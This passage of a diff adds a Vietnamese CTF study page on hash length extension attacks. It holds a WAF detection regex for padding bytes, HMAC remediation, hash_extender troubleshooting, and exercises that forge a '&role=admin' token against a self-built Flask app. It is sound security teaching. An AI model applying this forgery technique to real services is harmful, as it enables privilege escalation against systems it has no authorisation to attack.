+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex trên tham số data đã URL-decode)</th><th>Khớp gì</th></tr>
+    <tr><td><code>\x80[\x00]{2,}</code> xuất hiện trong giá trị <code>data</code></td><td>Byte padding đặc trưng Merkle-Damgård (<code>0x80</code> theo sau nhiều <code>0x00</code>) — hiếm khi xuất hiện trong dữ liệu hợp lệ thông thường</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Rule có false positive thấp</span>Vì chuỗi padding này rất đặc thù về
+  cấu trúc byte, rule này tương đối an toàn để bật — khác nhiều lỗ hổng khác (IDOR, CSRF...) không có chữ ký rõ
+  ràng để WAF bắt.</div>
+  <p><strong>Fix đúng (ở code, không phải WAF):</strong> đổi sang <strong>HMAC</strong>
+  (<code>hmac.new(secret, data, hashlib.sha256)</code> trong Python, hoặc tương đương ở ngôn ngữ khác) — không
+  bao giờ tự ghép <code>hash(secret + data)</code> tay.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi hash_extender không ra kết quả đúng</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Mọi candidate đều bị server từ chối</td><td>Tham số <code>--data</code> không khớp CHÍNH XÁC byte-by-byte với dữ liệu server thực sự đã hash (thiếu/dư 1 ký tự, encoding khác)</td><td>Copy lại chuỗi data gốc thật cẩn thận từ request thật, kiểm tra kỹ encoding (URL-decode trước khi đưa vào hash_extender nếu cần)</td></tr>
+    <tr><td>Sai thuật toán, output toàn giá trị vô nghĩa</td><td>Đoán nhầm MD5/SHA1/SHA256 chỉ dựa độ dài hex (có thể trùng ở biến thể khác)</td><td>Thử lần lượt <code>--format md5</code>, <code>sha1</code>, <code>sha256</code> nếu độ dài hex nghi ngờ nhiều thuật toán</td></tr>
+    <tr><td>Server dùng Base64 cho data, không phải raw/hex</td><td>App decode data theo cách khác với mặc định hash_extender in ra</td><td>Thử <code>--out-data-format hex</code> rồi tự convert sang base64 bằng tay/script nếu cần</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App tự ghép <code>hash(secret + data)</code> hoặc <code>hash(data + secret)</code> bằng hàm Merkle-Damgård trần (MD5/SHA1/SHA256/SHA512), và bạn có ít nhất 1 cặp data+sig hợp lệ.</td></tr>
+    <tr><td>❌</td><td>App dùng HMAC đúng chuẩn (<code>hmac.new()</code>, <code>HMAC-SHA256</code>...) — thuộc tính "trạng thái cuối = đủ để tiếp tục" bị phá vỡ, length extension không áp dụng được.</td></tr>
+    <tr><td>❌</td><td>Hash dùng là SHA3 (Keccak) — xây theo cấu trúc "sponge", KHÔNG phải Merkle-Damgård, không bị length extension.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 Flask app nhỏ cấp "token" dạng <code>sha256(SECRET + "uid=1").hexdigest()</code>,
+  tự chạy hash_extender để thêm <code>&amp;role=admin</code> và được app chấp nhận.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Chọn SECRET cố định ngắn (vd 8 ký tự) để biết trước đáp án đúng khi
+  luyện, sau đó thử lại không biết độ dài để luyện quét <code>--secret-min/--secret-max</code>.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> đổi thuật toán app dùng từ SHA256 sang MD5, chạy lại với
+  <code>--format md5</code>, so sánh độ dài block/padding khác gì.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>MD5 và SHA256 đều có block size 64 byte nên padding tương tự về
+  cấu trúc, chỉ khác độ dài output hash (16 byte vs 32 byte).</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app đổi sang <code>hash(data + secret)</code> (secret ở CUỐI, không phải
+  đầu). Giải thích vì sao length extension KHÔNG áp dụng được trực tiếp trong trường hợp này, và nguyên tắc nào
+  (từ mục 03) bị phá vỡ.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Length extension cần biết TOÀN BỘ dữ liệu đã hash để tính padding
+  đúng vị trí — nếu secret ở cuối, bạn không biết secret nên không biết chính xác padding sẽ nằm ở đâu/giá trị
+  gì (phụ thuộc tổng độ dài gồm cả secret không biết nội dung); ngược lại khi secret ở ĐẦU, bạn biết chính xác
+  phần data ở sau, nên chỉ cần đoán ĐỘ DÀI secret (1 số), không cần đoán NỘI DUNG.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Merkle-Damgård construction</td><td>Cách xây hàm hash xử lý tuần tự theo khối, trạng thái cuối = giá trị hash.</td></tr>
+    <tr><td>HMAC</td><td>Chuẩn tạo chữ ký bằng hash có cấu trúc đặc biệt chống được length extension.</td></tr>
+    <tr><td>Padding (của hash)</td><td>Các byte tự động thêm vào cuối dữ liệu trước khi hash để đủ bội số kích thước khối.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ offline:</strong> <code>~/hoc/CTF/Tools/web/hash_extender/</code> (đã
+  build sẵn, chạy <code>./hash_extender --help</code> để xem đủ tham số).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("hle-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("hle-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
